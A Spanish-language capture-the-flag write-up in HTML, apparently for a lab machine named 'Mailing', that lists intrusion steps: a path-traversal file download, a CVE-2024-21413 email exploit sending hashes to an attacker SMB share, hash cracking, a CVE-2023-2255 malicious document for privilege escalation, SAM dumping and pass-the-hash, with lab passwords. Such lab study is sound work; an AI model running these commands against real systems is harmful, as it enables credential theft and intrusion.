<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Mailing</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Mailing</h1><br/><p><ol><li>Realizo un escaneo de puertos. Tarda mucho por lo que reduzco el numero de puertos <strong>nmap 10.10.11.14 -Pn -sC -sV -A -T4 -oN scan.txt</strong></li><li>Veo el código de la página web y veo que se usa una sentencia php para poder descargar un archivo (LFI)</li><li>Con la ruta descargo las credenciales <a href="http://mailing.htb/download.php?file=../../../Program+Files(x86)/hMailServer/Bin/hMailServer.INI">http://mailing.htb/download.php?file=../../../Program+Files(x86)/hMailServer/Bin/hMailServer.INI</a> </li></ol><img src="images/73-1.png" alt="images/73-1.png" /><ol><li>En los archivos encuentro el hash de la pass del usuario administrator(default): 841bb5acfa6779ae432fd7a4e6600ba7 </li></ol><img src="images/73-2.png" alt="images/73-2.png" /><ol><li>Con hash-identifier averiguo que es un hash md5 </li></ol><img src="images/73-3.png" alt="images/73-3.png" /><ol><li>Encuentro que es vulnerable a CVE-2024-21413 y tenemos las credenciales de usuario smtp</li></ol></p><p><strong>  python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url &#39;\\&lt;ip&gt;&#39; --subject XD</strong><ol><li>Lo capturo con responder <strong>sudo responder -I tun0</strong></li><li>Puedo ver lo que capturó en<strong> /usr/share/responder/logs</strong> </li></ol><img src="images/73-4.png" alt="images/73-4.png" /><ol><li></li></ol><img src="images/73-5.png" alt="images/73-5.png" /><ol><li>Crackeo el hash <strong>hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt</strong></li><li>Encuentro la pass de maya </li></ol><img src="images/73-6.png" alt="images/73-6.png" /><ol><li>Con smbclient enumero los directorios a los que puedo acceder <strong>smbclient -L 10.10.11.14 -U &#39;maya&#39;</strong> </li></ol><img src="images/73-7.png" alt="images/73-7.png" /><ol><li>Me conecto con evil-winrm<strong> evil-winrm -i 10.10.11.14 -u &#39;maya&#39; -p m4y4ngs4ri</strong> </li></ol><img src="images/73-8.png" alt="images/73-8.png" /><ol><li>Busco otros usuarios y encuentro Administrador </li></ol><img src="images/73-9.png" alt="images/73-9.png" /><ol><li>Tras buscar encuentro que para escalar privilegios voy a tener que usar el <h3>CVE-2023-2255</h3> </li></ol><img src="images/73-10.png" alt="images/73-10.png" /><ol><li>Creo el exploit <strong>  python3 CVE-2023-2255.py --cmd &#39;net localgroup Administradores maya /add&#39; --output &#39;exploit.odt&#39;</strong></li><li>Arranco mi servidor smb</li></ol></p><p> <strong> impacket-smbserver mailing `pwd` -smb2support</strong><ol><li>Copio exploit.odt en C:/ Important Documents </li></ol><img src="images/73-11.png" alt="images/73-11.png" /><ol><li> n<strong> net use \\&lt;IP&gt;\mailing</strong> <strong>copy \\&lt;IP&gt;\mailing\exploit.odt</strong> </li></ol><img src="images/73-12.png" alt="images/73-12.png" /><ol><li>Espero a que maya sea admin y lo compruebo <strong>net user maya</strong> </li></ol><img src="images/73-13.png" alt="images/73-13.png" /><ol><li>dumpeo los hashes sam crackmapexec smb 10.10.11.14 -u maya -p &quot;m4y4ngs4ri&quot; --sam </li></ol><img src="images/73-14.png" alt="images/73-14.png" /><ol><li>Autentifico con los localadmin hashes impacket-wmiexec localadmin@10.10.11.14 -hashes &quot;&lt;hashes&gt;&quot; </li></ol><img src="images/73-15.png" alt="images/73-15.png" /></p></div>
</body>
</html>
